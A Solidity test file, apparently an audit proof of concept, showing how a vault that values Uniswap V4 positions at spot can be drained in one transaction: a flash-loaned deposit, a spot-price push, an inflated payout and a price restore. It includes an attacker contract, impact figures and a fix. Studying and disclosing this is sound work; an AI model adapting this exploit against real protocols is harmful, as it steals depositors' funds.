// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {SqrtPriceMath} from "@uniswap/v4-core/src/libraries/SqrtPriceMath.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {MockV4} from "../../mocks/v4/MockV4.sol";
import {AccountingPocFixture} from "./AccountingPocFixture.sol";

/// @notice The whole attack in one call, so it runs inside one transaction and can be funded by a flash loan.
/// @dev `MockV4.setTick` stands in for the two legs of the attacker's own swap sandwich on the pool (buy WETH up to
///      the moved price, sell it back). On a real pool the two legs cost the attacker only the pool fee on the
///      liquidity crossed, which the test bounds with the pool's own math.
contract FlashExitAttacker {
    function attack(
        ICoreVault core,
        IERC20 usdc,
        MockV4 pool,
        bytes32 poolId,
        int24 fairTick,
        int24 movedTick,
        uint256 amount,
        bool drainIdle
    ) external returns (uint256 usdcPaid) {
        usdc.approve(address(core), amount);
        // 1. Mint at the fair Share Price.
        core.deposit(amount, 0);
        // 2. First leg: push the pool's spot price away from the oracle price.
        pool.setTick(poolId, movedTick);
        // 3. Exit at the inflated Share Price, paid from Idle. No term, no lock (Instant Payout). Asking for exactly
        //    Free Idle keeps the claim Idle-paid (no unwind), so the inflated value is never tested against a sale.
        core.requestPayout(drainIdle ? core.freeIdle() : 1_000_000_000e6, ICoreVault.PayoutMode.Instant);
        usdcPaid = core.claimPayout("").usdcPaid;
        // 4. Second leg: bring the pool back.
        pool.setTick(poolId, fairTick);
    }
}

/// @title PoC: Share Assets value Uniswap V4 principal at the pool's spot composition, so a spot move inside one
///        transaction inflates the Share Price and an exit paid from Idle keeps the difference
/// @notice Severity: CRITICAL (direct theft of customer funds from the remaining Shareholders: atomic, flash-loanable,
///         no privilege; bounded only by Free Idle when the fund holds a wide or full-range position).
///
/// Root cause: `UniswapV4Adapter.positionValue` reports `principal0` / `principal1` as the token amounts the position
/// holds at the pool's CURRENT `slot0` price (`_principal`), and `CoreVaultLogic._positionsPrincipal` values those
/// amounts with the Chainlink price. Nothing ties the pool's spot price to the oracle price. For a liquidity range,
/// amounts-at-spot valued at a fixed external price P are minimal exactly when spot equals P: moving spot in either
/// direction makes the position look richer (it "sold" WETH above P or "bought" it below P on paper). DEC-067 asks
/// for a "guarded pool price" and QA3 leaves the guard's parameters OPEN; the code ships with no guard on the
/// valuation path, neither for a payout nor for a mint. The same holds for spoke positions: `SpokeVault.report()` is
/// permissionless and snapshots the spoke pool's spot composition into a report the hub prices for its whole life.
///
/// Attack sequence (one transaction, `FlashExitAttacker.attack`):
///  1. flash-borrow USDC and `deposit` at the fair Share Price;
///  2. swap in the fund's hub pool until spot leaves the fund's range (first leg of a sandwich);
///  3. `requestPayout(Instant)` and `claimPayout`: `recordValuation` reads the inflated principal, the burn is priced
///     at the inflated Share Price and paid from Idle;
///  4. swap back (second leg), repay the loan.
///
/// Impact (both tests, a 1,000,000 USDC fund with 800,000 USDC in one hub position and about 0.05 % pool fee):
///  - range of about -33 % / +50 % around the price (`test_POC_sharePriceInflatedByPoolSpotMoveInOneTransaction`): the
///    measured position value rises about 11 %; the attacker nets about 12,700 USDC in one transaction after the
///    deposit flow fee, the 2 % Payout Fee and the payout flow fee, for about 500 USDC of pool fees; the remaining
///    Shareholder loses about 20,700 USDC;
///  - full range (`test_POC_fullRangePositionLetsAHolderDrainAllFreeIdle`): the inflation is unbounded, so a 100,000
///    USDC entrant prices its shares above the whole Free Idle and takes all of it, about 190,000 USDC of other
///    people's money for about 2,800 USDC of pool fees, and still holds shares afterwards.
/// A matured Standard Payout Request removes the 2 % fee. The claim must stay Idle-paid (an unwind would sell at the
/// moved price and make the attacker's first leg real), which the attacker controls with the amount it requests.
///
/// Fix: never value a price-dependent position from its spot composition. Value it from `liquidity`, `tickLower`,
/// `tickUpper` (already in `PositionValue` and in the report) at the sqrt price implied by the oracle price, and/or
/// revert mints and cap payouts when `slot0` deviates from the oracle price by more than a bound (the QA3 guard).
contract SharePriceSpotManipulationPoC is AccountingPocFixture {
    /// @dev +-4,050 ticks: the position covers about -33 % / +50 % around the fair price.
    int24 internal constant HALF_WIDTH = 4050;
    /// @dev The attacker only has to leave the fund's range; 13,860 ticks is a price four times the oracle price.
    int24 internal constant TICK_MOVED = TICK_FAIR + 13_860;
    uint256 internal constant FLASH_LOAN = 300_000e6;

    function setUp() public {
        _deployFund(2000, 25);
    }

    function test_POC_sharePriceInflatedByPoolSpotMoveInOneTransaction() public {
        _deposit(alice, 1_000_000e6);
        bytes32 positionKey = _openHubPosition(800_000e6, HALF_WIDTH);
        uint256 fairAssets = core.shareAssets();
        uint256 fairPrice = core.sharePrice();
        uint256 aliceFair = _valueOf(alice);
        assertApproxEqAbs(fairAssets, 997_500e6, 1e6, "fair Share Assets: Idle plus the position at the oracle price");

        // What the spot move alone does to the published value bases (no token moved, the oracle did not move).
        uint256 snapshot = vm.snapshotState();
        v4.setTick(hubPoolId, TICK_MOVED);
        uint256 inflatedAssets = core.shareAssets();
        uint256 inflatedPrice = core.sharePrice();
        vm.revertToState(snapshot);
        assertGt(inflatedAssets, fairAssets + 80_000e6, "Share Assets inflated by more than 80,000 USDC");
        assertGt(inflatedPrice, fairPrice + fairPrice * 8 / 100, "Share Price inflated by more than 8 %");

        // The attack, in one call.
        FlashExitAttacker attacker = new FlashExitAttacker();
        usdc.mint(address(attacker), FLASH_LOAN);
        _refreshPrices();
        uint256 paid = attacker.attack(core, usdc, v4, hubPoolId, TICK_FAIR, TICK_MOVED, FLASH_LOAN, false);

        // The flash loan is repaid out of the attacker's balance; what is left is profit before pool fees.
        uint256 balance = usdc.balanceOf(address(attacker));
        assertGt(balance, FLASH_LOAN, "the attacker holds more USDC than it borrowed");
        uint256 grossProfit = balance - FLASH_LOAN;
        assertEq(shares.balanceOf(address(attacker)), 0, "full exit");
        assertGt(paid, 0);

        // Pool fees of the sandwich: both legs cross only the fund's liquidity between the fair price and the upper
        // tick of its range (the pool has no other liquidity; in a shared pool the legs also cross other LPs').
        uint256 poolFees = _sandwichPoolFees(positionKey);
        assertGt(grossProfit, 10_000e6, "more than 10,000 USDC in one transaction");
        assertGt(grossProfit, 20 * poolFees, "profit is more than 20 times the cost of moving the pool");

        // The pool is back at the fair price and the oracle never moved: the remaining Shareholder paid.
        assertEq(core.sharePrice() < fairPrice, true, "Share Price is below the fair price after the attack");
        uint256 aliceLoss = aliceFair - _valueOf(alice);
        assertGt(aliceLoss, grossProfit, "Alice lost at least what the attacker took");

        emit log_named_decimal_uint("Share Assets fair (USDC)", fairAssets, 6);
        emit log_named_decimal_uint("Share Assets at moved spot (USDC)", inflatedAssets, 6);
        emit log_named_decimal_uint("attacker profit before pool fees (USDC)", grossProfit, 6);
        emit log_named_decimal_uint("pool fees of the sandwich (USDC)", poolFees, 6);
        emit log_named_decimal_uint("Alice loss (USDC)", aliceLoss, 6);
    }

    /// @notice The same attack against a full-range position: the inflation has no bound, so a holder of 9 % of the
    ///         shares prices them above the whole Free Idle and takes all of it.
    /// @dev Spot is pushed to 64 times the oracle price (41,590 ticks). A full-range position then reads as 4 times
    ///      its fair value at the oracle price. The attacker asks for exactly Free Idle, so the claim is Idle-paid.
    function test_POC_fullRangePositionLetsAHolderDrainAllFreeIdle() public {
        int24 movedTick = TICK_FAIR + 41_590;
        _deposit(alice, 1_000_000e6);
        bytes32 positionKey = _openHubPositionAt(800_000e6, -887_270, 887_270);
        uint256 aliceFair = _valueOf(alice);
        uint256 fairPrice = core.sharePrice();

        FlashExitAttacker attacker = new FlashExitAttacker();
        uint256 loan = 100_000e6;
        usdc.mint(address(attacker), loan);
        _refreshPrices();
        attacker.attack(core, usdc, v4, hubPoolId, TICK_FAIR, movedTick, loan, true);

        // Every USDC of Free Idle left the Core Vault: Alice's uninvested 197,500 USDC and the attacker's own deposit.
        assertLt(core.freeIdle(), 5e6, "Free Idle is drained to dust");
        uint256 grossProfit = usdc.balanceOf(address(attacker)) - loan;
        assertGt(grossProfit, 185_000e6, "more than 185,000 USDC out of a 1,000,000 USDC fund in one transaction");
        assertGt(shares.balanceOf(address(attacker)), 0, "and the attacker still holds shares");

        uint128 liquidity = hubV4.positionValue(positionKey).liquidity;
        uint256 usdcIn = SqrtPriceMath.getAmount1Delta(
            TickMath.getSqrtPriceAtTick(TICK_FAIR), TickMath.getSqrtPriceAtTick(movedTick), liquidity, true
        );
        uint256 poolFees = 2 * usdcIn * POOL_FEE_PIPS / 1e6;
        assertGt(grossProfit, 50 * poolFees, "profit is more than 50 times the cost of moving the pool");

        assertApproxEqRel(core.sharePrice(), fairPrice * 80 / 100, 0.02e18, "the Share Price lost about 20 %");
        uint256 aliceLoss = aliceFair - _valueOf(alice);
        assertGt(aliceLoss, 190_000e6, "Alice lost more than 190,000 USDC");

        emit log_named_decimal_uint("attacker profit before pool fees (USDC)", grossProfit, 6);
        emit log_named_decimal_uint("pool fees of the sandwich (USDC)", poolFees, 6);
        emit log_named_decimal_uint("Free Idle left (USDC)", core.freeIdle(), 6);
        emit log_named_decimal_uint("Alice loss (USDC)", aliceLoss, 6);
    }

    /// @dev Pool fee of a round trip that moves spot from the fair price to the position's upper tick and back,
    ///      crossing the fund's liquidity: `fee * (USDC in on the way up + USDC value of the WETH in on the way
    ///      back)`, with the PoolManager's own `SqrtPriceMath`. Above the upper tick there is nothing to cross.
    function _sandwichPoolFees(bytes32 positionKey) internal view returns (uint256) {
        uint128 liquidity = hubV4.positionValue(positionKey).liquidity;
        uint160 sqrtFair = TickMath.getSqrtPriceAtTick(TICK_FAIR);
        uint160 sqrtUpper = TickMath.getSqrtPriceAtTick(TICK_FAIR + HALF_WIDTH);
        uint256 usdcIn = SqrtPriceMath.getAmount1Delta(sqrtFair, sqrtUpper, liquidity, true);
        // The second leg sells back the WETH the first leg bought, for about the same USDC amount.
        return 2 * usdcIn * POOL_FEE_PIPS / 1e6;
    }
}
